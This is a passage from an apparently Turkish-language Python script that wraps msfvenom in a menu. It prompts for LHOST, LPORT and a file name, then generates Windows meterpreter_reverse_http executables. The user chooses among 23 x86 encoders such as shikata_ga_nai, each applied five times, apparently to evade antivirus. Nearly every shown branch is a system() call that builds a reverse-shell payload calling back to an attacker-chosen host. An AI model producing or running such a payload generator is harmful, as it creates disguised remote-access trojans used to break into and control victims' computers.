            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '12':
        p12 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p12} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print('HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '13':
        p13 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p13} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print('HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '14':
        p14 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
